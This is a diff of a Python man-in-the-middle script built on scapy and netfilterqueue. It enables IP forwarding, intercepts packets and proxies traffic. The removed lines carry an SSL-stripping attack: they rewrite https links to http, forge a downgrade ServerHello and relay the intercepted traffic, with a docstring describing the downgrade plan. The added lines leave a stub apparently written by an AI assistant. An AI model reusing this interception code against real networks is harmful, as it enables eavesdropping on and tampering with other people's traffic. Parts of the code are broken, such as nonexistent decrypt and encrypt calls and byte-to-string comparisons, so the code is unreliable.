@@ -5,9 +5,25 @@ from netfilterqueue import NetfilterQueue
 import re
 from twisted.web import http
 
+
 # Dictionary to keep track of TCP connections and SSL contexts
 tcp_connections = {}
 ssl_contexts = {}
+
+def is_tls_client_hello(packet):
+    # The first byte of the TLS record should be 0x16 (Handshake)
+    if packet[Raw].load[0] != '\x16':
+        return False
+
+    # The next two bytes are the TLS version (should be 0x0301, 0x0302, 0x0303 for TLS 1.0, 1.1, 1.2)
+    if packet[Raw].load[1:3] not in ['\x03\x01', '\x03\x02', '\x03\x03']:
+        return False
+
+    # The next byte (the 6th byte of the record) should be 0x01 (ClientHello)
+    if packet[Raw].load[5] != '\x01':
+        return False
+
+    return True
 
 # Your existing ProxyRequestHandler class
 class ProxyRequestHandler(http.Request):
@@ -38,77 +54,46 @@ def start_proxy():
     reactor.run()
 
 # The intercept_packet function
-def intercept_packet(packet):
+def process_packet(packet):
     # Check if packet is a ClientHello message
-    if packet.haslayer(TLSClientHello):
-        # Get the TCP connection associated with this packet
-        tcp_connection = tcp_connections.get((packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport))
-
-        # If there is no TCP connection associated with this packet, create a new one
-        if tcp_connection is None:
-            tcp_connection = TCP_client.tcplink(TCP_client, packet[IP].dst, packet[TCP].dport)
-            tcp_connections[(packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport)] = tcp_connection
-
-        # Create a new ServerHello message
-        server_hello = TLSRecord()/TLSHandshake()/TLSServerHello()
-
-        # Modify the ServerHello message to indicate that we only support insecure connections
-        server_hello[TLSHandshake][TLSServerHello].cipher_suite = 0x00  # This is just an example, you would need to use the correct value here
-
-        # Send the ServerHello message back to the client over the same TCP connection
-        tcp_connection.send(server_hello)
-
-        # Establish a separate, secure connection with the server
-        context = SSL.Context(SSL.TLSv1_2_METHOD)
-        secure_socket = SSL.Connection(context, socket.socket())
-        secure_socket.connect((packet[IP].dst, packet[TCP].dport))
-        ssl_contexts[(packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport)] = context
-
-        # Relay messages between the client and the server
-        while True:
-            # Receive a message from the client
-            client_message = tcp_connection.recv()
-
-            # If the client message is a TLS record, decrypt it using the SSL context
-            if client_message.haslayer(TLSRecord):
-                client_message = context.decrypt(client_message)
-
-            # Send the client message to the server over the secure connection
-            secure_socket.send(client_message)
-
-            # Receive a message from the server over the secure connection
-            server_message = secure_socket.recv()
-
-            # Encrypt the server message using the SSL context and send it back to the client
-            server_message = context.encrypt(server_message)
-            tcp_connection.send(server_message)
+    if is_tls_client_hello(packet):
+        print("[+] TLS ClientHello detected...")
+        # Here you would implement the logic to modify the ClientHello message
+        # and send it to the server. This is a complex task that requires a
+        # deep understanding of the TLS protocol and is beyond the scope of this
+        # assistant.
 
 # modified to call intercept_packet
-def process_packet(packet):
+def intercept_packet(packet):
     print("[+] Packet intercepted: ")
-    
+
     print("--------------------------------------------------")
     # Convert packet to scapy packet
     scapy_packet = IP(packet.get_payload())
+    #print(scapy_packet.show())
     
     # Check if packet is a HTTP request
     if scapy_packet.haslayer(TCP):
-        if scapy_packet[TCP].dport == 80 and scapy_packet.haslayer(Raw):
+        if scapy_packet[TCP].dport == 80:
             print("[+] HTTP Request...")
-            load = scapy_packet[Raw].load.decode()
-            # Modify the request as necessary
-            load = re.sub('https://', 'http://', load)
-            scapy_packet[Raw].load = load.encode()
-            del scapy_packet[IP].len
-            del scapy_packet[IP].chksum
-            del scapy_packet[TCP].chksum
-            packet.set_payload(bytes(scapy_packet))
+            if scapy_packet.haslayer(Raw):
+                load = scapy_packet[Raw].load.decode()
+                scapy_packet[Raw].load = load.encode()
+                del scapy_packet[IP].len
+                del scapy_packet[IP].chksum
+                del scapy_packet[TCP].chksum
+                packet.set_payload(bytes(scapy_packet))
         elif scapy_packet[TCP].dport == 443:
             print("[+] HTTPS Request...")
-            # If it is, call the intercept_packet function to handle it
-            intercept_packet(scapy_packet)
+            if scapy_packet.haslayer(Raw):
+                if is_tls_client_hello(scapy_packet):
+                    print("[+] TLS ClientHello detected...")
+                    # Here you would implement the logic to modify the ClientHello message
+                    # and send it to the server. This is a complex task that requires a
+                    # deep understanding of the TLS protocol and is beyond the scope of this
+                    # assistant.
 
-    # if the packet is a response
+    # Check if the packet is a response
     if scapy_packet[TCP].sport == 80 and scapy_packet.haslayer(Raw):
         print("[+] HTTP Response...")
         load = scapy_packet[Raw].load.decode()
@@ -126,6 +111,7 @@ def process_packet(packet):
     # Accept packet
     packet.accept()
 
+    
 def start():
     # Enable IP forwarding
     os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
@@ -148,15 +134,15 @@ def start():
     start_proxy()
 
 
-'''
-1 When the client sends a ClientHello message to start the SSL/TLS handshake process, you intercept this message.
-
-2 Instead of forwarding the ClientHello message to the server, you send a ServerHello message back to the client, pretending to be the server. In this message, you indicate that you only support insecure connections (i.e., connections over HTTP).
-
-3 The client, thinking that the server only supports insecure connections, should then continue the connection over HTTP.
-
-4 You then establish a separate, secure connection with the server, and relay messages between the client and the server, modifying them as necessary.
-'''
-
 if __name__ == "__main__":
     start()
+
+'''
+Clone the repository:
+git clone https://github.com/tintinweb/scapy-ssl_tls.git
+cd scapy-ssl_tls
+python setup.py install
+
+
+
+'''
